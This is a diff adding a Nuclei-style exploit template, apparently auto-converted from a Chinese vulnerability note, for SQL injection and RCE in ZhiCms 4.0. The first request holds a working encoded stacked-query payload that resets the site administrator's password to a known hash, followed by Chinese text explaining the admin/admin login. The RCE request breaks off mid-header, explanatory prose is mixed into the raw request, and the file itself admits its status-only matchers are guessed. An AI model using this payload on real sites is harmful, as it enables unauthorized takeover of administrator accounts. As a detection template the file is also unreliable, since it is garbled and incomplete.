@@ -1,0 +1,126 @@
+id: poc-pm5cfx5z4or48gxt
+info:
+  name: ZhiCms 4.0的SQL注入与RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pm5cfx5z4or48gxt
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pm5cfx5z4or48gxt
+http:
+- raw:
+  - 'POST /index.php?r=index/m/getindexdata HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Length: 289
+
+
+    sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    sec-ch-ua-mobile: ?0
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+
+
+    sec-ch-ua-platform: "macOS"
+
+
+    Origin: [http://127.0.0.1:8888](http://127.0.0.1:8888)
+
+
+    Sec-Fetch-Site: same-origin
+
+
+    Sec-Fetch-Mode: cors
+
+
+    Sec-Fetch-Dest: empty
+
+
+    Referer: [http://127.0.0.1:8888/index.php?r=manage/login/index](http://127.0.0.1:8888/index.php?r=manage/login/index)
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: PHPSESSID=gclnhtp52rldnj5p9ckp389h2h
+
+
+    Connection: close
+
+
+    action=search&key=%2525%2527%253Bupdate%2520yun%255Fmanage%2520set%2520password%253D%2527bbe375100175e7b98339a98e0a07083b%2527%2520where%2520id%253D%25271%2527%253BSELECT%2520%252A%2520FROM%2520%2560yun%255Farticle%2560%2520%2520WHERE%2520%2560title%2560%2520LIKE%2520%2520%2527%2525&mall=
+
+
+    更新yun_manage表中id为1所设置的密码为’bbe375100175e7b98339a98e0a07083b’，同时使用了分号（;）作为语句的分隔符。随后，可以访问网站的管理员登录页面，网址为
+
+
+    [http://127.0.0.1:8888/index.php?r=manage/login/index](http://127.0.0.1:8888/index.php?r=manage/login/index)
+
+
+    然后使用admin/admin登录直接进入后台。
+
+
+    1. RCE'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /index.php?r=manage/set/index HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Length: 229
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    Origin: [http://127.0.0.1:8888](http://127.0.0.1:8888)
+
+
+    Referer: [http://127.0.0.1:8888/index.php?r=manage/set/index](http://127.0.0.1:8888/index.php?r=manage/set/index)
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
